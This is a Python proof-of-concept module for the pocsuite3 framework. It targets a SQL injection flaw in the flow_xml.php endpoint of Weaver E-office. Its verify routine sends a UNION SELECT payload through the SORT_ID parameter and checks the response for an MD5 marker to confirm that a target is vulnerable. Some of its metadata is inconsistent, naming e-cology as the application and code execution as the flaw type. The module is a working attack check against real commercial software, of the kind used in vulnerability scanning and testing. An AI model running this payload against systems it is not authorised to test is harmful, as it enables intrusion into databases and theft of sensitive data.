from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '泛微 E-office flow_type/flow_xml.php 存在SQL注入漏洞'
    appName = '泛微 e-cology'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''泛微 E-office存在SQL注入漏洞，攻击者可利用该漏洞获取系统敏感信息等。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        path = "/general/system/workflow/flow_type/flow_xml.php?SORT_ID=1%20union%20select%201,(md5(5)),3,4,5,6,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1"
        vul_url = self.url+path
        resp = requests.get(vul_url, verify = False, allow_redirects = False, timeout = 10)
        if 'e4da3b7fbbce2345d7772b0674a318d5' in resp.text and resp.status_code == 200:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vul_url
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
